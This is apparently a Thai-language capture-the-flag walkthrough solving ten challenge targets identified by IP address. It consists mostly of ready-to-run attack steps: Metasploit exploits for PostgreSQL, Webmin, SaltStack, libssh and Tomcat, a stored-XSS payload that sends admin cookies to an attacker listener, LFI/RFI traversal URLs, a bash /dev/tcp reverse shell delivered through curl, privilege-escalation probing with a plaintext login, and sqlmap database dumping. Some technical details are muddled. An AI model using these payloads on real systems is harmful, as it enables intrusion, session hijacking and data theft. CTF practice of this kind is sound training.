🚩 Tower #0: CVE-2019-9193 - PostgreSQL - RCE
🎯 เป้าหมาย: อ่านไฟล์ /tmp/flag.txt

นี่คือช่องโหว่ PostgreSQL COPY FROM PROGRAM RCE

    ใช้ Metasploit:
    Bash

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

ตั้งค่าเป้าหมาย:
Bash

set RHOSTS 136.110.46.225
set RPORT 5432
set USERNAME postgres # ตามโจทย์
set PASSWORD <PASSWORD_IF_NEEDED> # หากไม่ต้องการให้ลองใส่รหัสผ่านเปล่าหรือรหัสผ่านทั่วไป

ตั้งค่า Payload (ดึง Flag โดยตรง): เนื่องจาก Reverse Shell มักจะล้มเหลว ให้ใช้ cmd/unix/generic เพื่อรันคำสั่ง cat โดยตรง
Bash

set PAYLOAD cmd/unix/generic
set CMD 'cat /tmp/flag.txt'

รัน Exploit:
Bash

    exploit

🚩 Tower #1: Cross Site Script (XSS) - Stored XSS
🎯 เป้าหมาย: ขโมย Session/Cookie ของ Admin

นี่คือช่องโหว่ Stored XSS โดยใช้หน้า Support เพื่อขโมย Cookie ของ Admin และดึง Flag

    ตั้งค่า Netcat Listener: เปิด Listener บน Port 4444 (หรือ Port อื่นที่เปิดอยู่บน Kali) เพื่อรับ Cookie ที่ถูกขโมยมา
    Bash

nc -lvnp 4444

สร้าง Malicious Payload: ใช้ JavaScript เพื่อขโมย document.cookie แล้วส่งกลับไปที่ Listener ของคุณ (โดยใช้ IP ของ Kali หรือ ngrok)
JavaScript

    <script>fetch('http://[YOUR_KALI_IP]:4444/?cookie=' + document.cookie);</script>

    ฉีด Payload: เข้าไปที่หน้า Support ของ http://34.87.33.218 แล้ว ใส่ Payload JavaScript ลงในช่อง Input ที่ Admin จะมาดู (เช่น ช่อง Topic หรือ Content)

    รอรับ Session: เมื่อ Admin เข้ามาดูหน้า Support นั้น Browser ของ Admin จะรัน Script และส่ง Cookie กลับมาที่ Netcat Listener ของคุณ

    ใช้ Cookie: ใช้ Cookie ที่ได้มา (Session ID) ในเครื่องมือ (เช่น Burp Suite) เพื่อเข้าสู่ระบบในฐานะ Admin และดู Flag

🚩 Tower #2: Local File Inclusion (LFI) / Remote File Inclusion (RFI)
🎯 เป้าหมาย: อ่านไฟล์ /tmp/flag.txt

เนื่องจากโจทย์อนุญาตทั้ง LFI และ RFI เราจะใช้ LFI ในการอ่านไฟล์โดยตรงก่อน (ถ้าทำได้) หากไม่ได้จะใช้ RFI
💡 วิธีที่ 1: Local File Inclusion (LFI)

    ค้นหา Injection Point: ค้นหาพารามิเตอร์ URL ที่น่าสงสัย (เช่น ?page=, ?file=) บน http://136.110.1.31

    ทดสอบ LFI: ลองใช้เทคนิค Directory Traversal เพื่ออ่านไฟล์ระบบ

    http://136.110.1.31/index.php?page=../../../../etc/passwd

    อ่าน Flag: เมื่อยืนยัน LFI ได้แล้ว ให้อ่านไฟล์ Flag โดยตรง:

    http://136.110.1.31/index.php?page=../../../../tmp/flag.txt

💡 วิธีที่ 2: Remote File Inclusion (RFI)

    สร้าง Malicious Script: สร้างไฟล์ PHP บนเครื่อง Kali ของคุณ (เช่น shell.txt) ที่มีคำสั่ง cat เพื่ออ่าน Flag:
    PHP

<?php echo file_get_contents('/tmp/flag.txt'); ?>

เปิด HTTP Server: ให้ไฟล์นี้เข้าถึงได้จากภายนอก:
Bash

    python3 -m http.server 8000

    ฉีด Payload RFI: ใช้ URL เพื่อสั่งให้ Target Server โหลดและรันสคริปต์ของคุณ (โดยใช้ IP ของ Kali):

    http://136.110.1.31/index.php?page=http://[YOUR_KALI_IP]:8000/shell.txt

🚩 Tower #3: CVE-2019-15107 - Webmin - RCE
🎯 เป้าหมาย: อ่านไฟล์ /tmp/flag_random.txt

นี่คือช่องโหว่ Webmin Command Injection บนพอร์ต 10000

    ใช้ Metasploit:
    Bash

use exploit/linux/http/webmin_show_server_info_rce

ตั้งค่าเป้าหมาย:
Bash

set RHOSTS 34.177.93.94
set RPORT 10000

ตั้งค่า Payload (ดึง Flag โดยตรง):
Bash

set PAYLOAD cmd/unix/generic
set CMD 'cat /tmp/flag_random.txt'

รัน Exploit:
Bash

    exploit

        หากไม่สำเร็จ ให้ลองใช้ Payload เป็น cmd/unix/reverse_netcat และตั้งค่า LHOST/LPORT เพื่อรับ Shell กลับมา

🚩 Tower #4: CVE-2020-11651 - SaltStack - RCE
🎯 เป้าหมาย: อ่านไฟล์ /tmp/flag_xxxxx.txt

นี่คือช่องโหว่ SaltStack RCE บนพอร์ต 4505/4506

    ใช้ Metasploit:
    Bash

use exploit/multi/saltstack/salt_master_exec

ตั้งค่าเป้าหมาย:
Bash

set RHOSTS 34.87.46.136
set RPORT 4506 # หรือ 4505 ขึ้นอยู่กับ Master Service

ตั้งค่า Payload (ดึง Flag โดยตรง):
Bash

set PAYLOAD cmd/unix/generic
set CMD 'cat /tmp/flag_xxxxx.txt'

รัน Exploit:
Bash

    exploit

🚩 Tower #5: CVE-2018-10933 - LibSSH - Auth Bypass
🎯 เป้าหมาย: อ่านไฟล์ /root/flag_xxxxxx.txt

นี่คือช่องโหว่ LibSSH Authentication Bypass

    ใช้ Metasploit:
    Bash

use auxiliary/scanner/ssh/libssh_auth_bypass

ตั้งค่าเป้าหมาย:
Bash

set RHOSTS 34.87.63.36
set RPORT 22

รัน Auxilary:
Bash

    run

        ถ้าสำเร็จ Module จะแจ้งว่า "Authentication Bypass Successful." และจะให้ Shell Session (ถ้า Module ได้รับการตั้งค่าที่เหมาะสม)

    อ่าน Flag: หากได้ Shell ให้ใช้คำสั่ง cat /root/flag_xxxxxx.txt

🚩 Tower #6: Privilege Escalation (PE)
🎯 เป้าหมาย: อ่านไฟล์ /root/flag_xxxxxx.txt

การโจมตีนี้เริ่มจากการ Login และต้องหาช่องทางในการยกระดับสิทธิ์ (Privilege Escalation)

    Login: เข้าสู่ระบบ 34.87.11.201:4200 ด้วย user=noob, password=N00bP@ssw0rd

    สำรวจ: เมื่อเข้าสู่ Shell แล้ว ให้สำรวจเครื่องด้วยคำสั่ง PE ทั่วไป:

        sudo -l: ตรวจสอบว่า noob สามารถรันคำสั่งใดในฐานะ root ได้โดยไม่ต้องใช้รหัสผ่าน

        find / -perm -4000 2>/dev/null: ตรวจสอบไฟล์ที่มีบิต SUID

        ls -la /opt/, crontab -l: ค้นหาสคริปต์ที่รันอัตโนมัติหรือไฟล์ที่น่าสงสัย

    PE Script (ถ้าจำเป็น): หากการสำรวจด้วยมือยาก ให้ใช้สคริปต์อัตโนมัติ (เช่น LinPEAS) โดยการโอนย้ายสคริปต์เข้าไปในเครื่องเป้าหมายแล้วรัน

    ยกระดับสิทธิ์: ใช้ช่องโหว่ที่พบ (เช่น SUID Binary, Sudo Misconfiguration) เพื่อยกระดับสิทธิ์เป็น root

    อ่าน Flag: เมื่อเป็น root แล้วให้อ่าน cat /root/flag_xxxxxx.txt

🚩 Tower #7: Apache Tomcat - CVE-2020-1938
🎯 เป้าหมาย: อ่านไฟล์ /root/flag.txt

นี่คือช่องโหว่ Apache Tomcat AJP File Read/Inclusion (Ghostcat)

    ใช้ Metasploit:
    Bash

use exploit/multi/http/tomcat_ajp_lfi

ตั้งค่าเป้าหมาย: (AJP Port คือ 8009)
Bash

set RHOSTS 34.87.102.147
set RPORT 8009 

ตั้งค่า FILE: (ไฟล์ Flag ที่ต้องการอ่าน)
Bash

set FILE /root/flag.txt

รัน Exploit:
Bash

    exploit

🚩 Tower #8: CVE-2017-17405 - Command Injection - Ruby
🎯 เป้าหมาย: อ่านไฟล์ /usr/src/flag.txt

นี่คือช่องโหว่ Ruby Command Injection (ในโค้ดที่คุณให้มาคือ LFI -> RFI)

    ตั้งค่า Reverse Shell Script:

        ใน Terminal ของ Kali, สร้างไฟล์ (เช่น shell.txt หรือ shell.php) ที่จะรัน Reverse Shell (ใช้ IP ของ Kali ที่เข้าถึงได้ หรือ ngrok)
    PHP

<?php system("bash -i >& /dev/tcp/[YOUR_KALI_IP]/4444 0>&1"); ?>

เปิด HTTP Server:
Bash

python3 -m http.server 8000

เปิด Netcat Listener:
Bash

nc -lvnp 4444

ฉีด Payload RFI/Command Injection:

    ใช้ curl เพื่อสั่งให้เป้าหมายโหลดและรันสคริปต์ของคุณผ่านช่องโหว่

    (จากตัวอย่างที่คุณให้มาเป็นการใช้ download?uri= เพื่อสั่งให้โหลดไฟล์):

Bash

    curl "http://34.124.149.106:8080/download?uri=http://[YOUR_KALI_IP]:8000/shell.txt&file=shell.txt"

        หมายเหตุ: ต้องแทนที่ IP/Port และชื่อไฟล์ตามที่ Target Server ต้องการ (ในโค้ดตัวอย่างของคุณใช้ ftp และ shell.pHp แต่เราจะใช้ HTTP และชื่อไฟล์ที่เหมาะสม)

    อ่าน Flag: เมื่อได้ Shell แล้วให้อ่าน cat /usr/src/flag.txt

🚩 Tower #9: Wordpress with well-known vulnerability
🎯 เป้าหมาย: อ่านค่า Flag ใน Database

นี่คือช่องโหว่ WordPress Plugin SQL Injection

    สแกนด้วย WPScan:
    Bash

wpscan --url http://35.240.142.53 --enumerate p

    สิ่งที่ต้องทำ: ค้นหา Plugin ที่ติดตั้งและมีช่องโหว่ SQL Injection (เช่น wp-support-plus, mailpress)

ใช้ SQLMap: เมื่อพบ Plugin ที่มีช่องโหว่ (และทราบพารามิเตอร์ที่ใช้) ให้ใช้ SQLMap
Bash

sqlmap -u "http://35.240.142.53/wp-content/plugins/[PLUGIN_NAME]/[VULN_PAGE].php?id=1" --dbs

    เปลี่ยน URL: แทนที่ [PLUGIN_NAME] และ [VULN_PAGE].php?id=1 ด้วยข้อมูลจริง

ดึง Flag: ดำเนินการดึงข้อมูลตามลำดับ: --dbs -> -D [DB_NAME] --tables -> -T [TABLE_NAME] --columns -> -C [COLUMN_NAME] --dump
